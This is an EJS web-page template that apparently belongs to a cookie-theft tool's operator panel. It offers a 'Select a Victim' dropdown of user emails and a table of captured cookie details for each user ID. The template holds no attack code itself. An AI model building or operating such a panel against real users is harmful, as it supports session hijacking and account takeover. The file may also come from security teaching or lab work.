<% include ./partials/header %>
<% include ./partials/navBar %>
<body>
<div class="container-fluid">
	<form action="/cookies" method="GET">
		<form>
			<div class="form-group">
				<label for="victimSelection">Select a Victim</label>
				<select name="selection" id="victimSelection" class="form-control">
					<option selected>Select a Victim</option>
					<% for (var result in users){ %>
					<option value="<%=users[result]['userID']%>"><%=users[result]['email']%></option>
					<% } %>
				</select>
			</div>
		  <button type="submit" class="btn btn-primary">Submit</button>
		</form><!--dropdown-->

	<div class="table-responsive panel-body">
		<h2> Cookies </h2>
		<table class="table table-hover table-striped">
			<thead class="thead-light">
				<th>UserID</th>
				<th>details</th>
			</thead>
			<%for (var result in rowData){%>
			<tr>
			  <td><%=rowData[result]['userID']%></td>
				<td><%=rowData[result]['details']%></td>
			  <%}%>
			</tr>
		</table>
		<br>
	</div>
</div>
</body>
<% include ./partials/footer %>
